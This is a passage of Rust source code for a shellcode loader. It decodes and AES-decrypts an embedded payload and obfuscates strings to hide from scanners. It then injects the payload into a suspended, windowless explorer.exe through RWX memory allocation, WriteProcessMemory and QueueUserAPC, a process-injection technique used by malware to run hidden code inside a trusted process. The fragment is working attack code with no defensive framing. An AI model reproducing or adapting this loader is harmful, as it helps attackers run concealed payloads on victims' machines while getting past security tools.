

    let cipher = Cipher::new_128(&PASSWORD1);
    let shellcode = base64_decode(String::from(SHELLCODE));
    let shellcode = cipher.cbc_decrypt(PASSWORD2, &shellcode[..]);
    let path:Vec<u16> = obfstr!("C:\\Windows\\explorer.exe\0").encode_utf16().collect();
    unsafe{
        let temp = zeroed::<SECURITY_ATTRIBUTES>();
        let mut  info = zeroed::<STARTUPINFOW>();
        info.cb = size_of::<STARTUPINFOW>() as _;
        let mut info2 = zeroed::<PROCESS_INFORMATION>();
        if CreateProcessW(PCWSTR(path.as_ptr() as _),PWSTR(std::ptr::null_mut()),&temp,&temp,BOOL(1),CREATE_NO_WINDOW|CREATE_SUSPENDED,null(),PCWSTR(null()),&info as _,&mut info2).as_bool(){
            let addr = VirtualAllocEx(info2.hProcess, null(), shellcode.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            WriteProcessMemory(info2.hProcess, addr, shellcode.as_ptr() as _, shellcode.len(), null_mut());

            QueueUserAPC(Some(std::mem::transmute(addr)),info2.hThread,0);
 
            ResumeThread(info2.hThread);

            CloseHandle(info2.hThread);
        }else{
            println!("failed : {:?}",GetLastError());
        }
    }

}

fn base64_decode(shellcode:String)->Vec<u8>{
    base64::decode_config(shellcode,base64::STANDARD_NO_PAD).unwrap()
}

